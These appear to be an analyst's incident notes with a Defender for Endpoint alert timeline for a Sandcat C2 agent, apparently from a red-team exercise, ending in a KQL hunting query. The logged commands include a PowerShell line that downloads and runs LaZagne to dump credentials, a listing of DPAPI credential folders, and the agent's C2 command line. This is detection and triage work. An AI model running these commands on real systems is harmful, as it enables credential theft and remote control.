 Suspicious process executed PowerShell command
Suspicious process executed PowerShell command Resolved Detected Medium
25/6/2026 10:40:25 
 [1828] wusvc.exe created [2544] powershell.exe -ExecutionPolicy Bypass -C "md \"$env:TEMP\svcmon\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',\"$env:TEMP\svcmon\lz.exe\"); & \"$env:TEMP\svcmon\lz.exe\" all"
Command line powershell.exe -ExecutionPolicy Bypass -C "md \"$env:TEMP\svcmon\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',\"$env:TEMP\svcmon\lz.exe\"); & \"$env:TEMP\svcmon\lz.exe\" all"
Process id 2544
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Image file SHA1 3e72bef25a1cd88c502421e3d50a8eb4c6bd1226
Image file creation time 14 Nov 2024 14:00:53
Image file last modification time 14 Nov 2024 14:00:53
Initiating process wusvc.exe
PE metadata powershell.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe


25/6/2026 04:45:12 
 [7664] nssm.exe
Process id 7664
Execution details Elevated, Integrity level: System
Image file path C:\Windows\Temp\nssm\nssm-2.24-101-g897c7ad\win64\nssm.exe
Image file SHA1 f280858dcfefabc1a9a006a57f6b266a5d1fde8e
Image file creation time 21 Mar 2026 17:55:31
Image file last modification time 27 Apr 2017 01:14:56
PE metadata nssm.exe
User NT AUTHORITY\SYSTEM
25/6/2026 04:45:12 
 [1828] wusvc.exe -server http://172.31.2.203:8888 -group red
Command line "wusvc.exe" -server http://172.31.2.203:8888 -group red
Process id 1828
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Users\Public\wusvc.exe
Image file SHA1 905f46e4536bbd62777a6924f4234fa2b6471968
Image file creation time 21 Mar 2026 16:48:03
Image file last modification time 21 Mar 2026 16:48:03
PE metadata wusvc.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline http://172.31.2.203:8888
Referenced in commandline 172.31.2.203
Remediation details Defender detected 'Trojan:Win64/SandCat.RTS!MTB' in file 'wusvc.exe'
25/6/2026 04:45:12 
 [1828] wusvc.exe loaded image wusvc.exe
SHA1 905f46e4536bbd62777a6924f4234fa2b6471968
Path C:\Users\Public\wusvc.exe
Size 6 MB
Is PE True
Creation time 21 Mar 2026 16:48:03
Last modified time 21 Mar 2026 16:48:03
PE metadata wusvc.exe
Remediation details Defender detected 'Trojan:Win64/SandCat.RTS!MTB' in file 'wusvc.exe'
An active 'SandCat' malware was detected Unknown Detected Low
25/6/2026 04:45:16 
 Defender detected active 'Trojan:Win64/SandCat.RTS!MTB' in process 'wusvc.exe'
Is runtime packed False
Threat name Trojan:Win64/SandCat.RTS!MTB
Detection time 25 Jun 2026 04:45:15
An active 'SandCat' malware process was detected while executing Unknown Detected Low
25/6/2026 04:45:16 
 wusvc.exe interacted with file wusvc.exe
SHA1 905f46e4536bbd62777a6924f4234fa2b6471968
Path C:\Users\Public\wusvc.exe
Size 6 MB
Is PE True
Creation time 21 Mar 2026 16:48:03
Last modified time 21 Mar 2026 16:48:03
PE metadata wusvc.exe
Remediation details Defender detected 'Trojan:Win64/SandCat.RTS!MTB' in file 'wusvc.exe'
An active 'SandCat' malware was detected Unknown Detected Low
25/6/2026 10:40:25 
 [2544] powershell.exe -ExecutionPolicy Bypass -C "md \"$env:TEMP\svcmon\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',\"$env:TEMP\svcmon\lz.exe\"); & \"$env:TEMP\svcmon\lz.exe\" all"
Command line powershell.exe -ExecutionPolicy Bypass -C "md \"$env:TEMP\svcmon\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',\"$env:TEMP\svcmon\lz.exe\"); & \"$env:TEMP\svcmon\lz.exe\" all"
Process id 2544
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Image file SHA1 3e72bef25a1cd88c502421e3d50a8eb4c6bd1226
Image file creation time 14 Nov 2024 14:00:53
Image file last modification time 14 Nov 2024 14:00:53
PE metadata powershell.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe
Suspicious process executed PowerShell command Resolved Detected Medium
Suspicious PowerShell command line Resolved Detected Medium
25/6/2026 10:40:26 
 powershell.exe executed a script
Content md "$env:TEMP\svcmon" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',"$env:TEMP\svcmon\lz.exe"); & "$env:TEMP\svcmon\lz.exe" all
Content SHA256 283929270d25b3029833001a362c92582f7547bb040f53552d4aa5342f323e88
25/6/2026 10:40:26 
 powershell.exe executed a script
Content 
<# 
.FORWARDHELPTARGETNAME New-Item
.FORWARDHELPCATEGORY Cmdlet 
#>

[CmdletBinding(DefaultParameterSetName='pathSet',
    SupportsShouldProcess=$true,
    SupportsTransactions=$true,
    ConfirmImpact='Medium')]
    [OutputType([System.IO.DirectoryInfo])]
param(
    [Parameter(ParameterSetName='nameSet', Position=0, ValueFromPipelineByPropertyName=$true)]
    [Parameter(ParameterSetName='pathSet', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [System.String[]]
    ${Path},

    [Parameter(ParameterSetName='nameSet', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
    [AllowNull()]
    [AllowEmptyString()]
    [System.String]
    ${Name},

    [Parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [System.Object]
    ${Value},

    [Switch]
    ${Force},

    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [System.Management.Automation.PSCredential]
    ${Credential}
)

begin {

    try {
        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('New-Item', [System.Management.Automation.CommandTypes]::Cmdlet)
        $scriptCmd = {& $wrappedCmd -Type Directory @PSBoundParameters }
        $steppablePipeline = $scriptCmd.GetSteppablePipeline()
        $steppablePipeline.Begin($PSCmdlet)
    } catch {
        throw
    }

}

process {

    try {
        $steppablePipeline.Process($_)
    } catch {
        throw
    }

}

end {

    try {
        $steppablePipeline.End()
    } catch {
        throw
    }

}


Content SHA256 c88de870547b7875cc69a83f952ec9d609af86576c03131afec7ee39d3321cab
25/6/2026 10:41:28 
 [4036] cmd.exe /C dir "%APPDATA%\Microsoft\Protect" /s /b 2>&1 & dir "%APPDATA%\Microsoft\Credentials" /s /b 2>&1 & dir "%LOCALAPPDATA%\Microsoft\Credentials" /s /b 2>&1
Command line cmd.exe /C dir "%APPDATA%\Microsoft\Protect" /s /b 2>&1 & dir "%APPDATA%\Microsoft\Credentials" /s /b 2>&1 & dir "%LOCALAPPDATA%\Microsoft\Credentials" /s /b 2>&1
Process id 4036
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\cmd.exe
Image file SHA1 bc2820b5ee7b43c172005b66546f12316de8c081
Image file creation time 10 Jul 2025 06:13:00
Image file last modification time 10 Jul 2025 06:13:00
PE metadata cmd.exe
User NT AUTHORITY\SYSTEM


![[Pasted image 20260917091719.png]]


![[Pasted image 20260917091732.png]]

![[Pasted image 20260917120330.png]]![[Pasted image 20260917121526.png]]DeviceFileEvents
| where FileName =~ "wusvc.exe"
| project Timestamp, DeviceName, FolderPath, SHA1, SHA256, MD5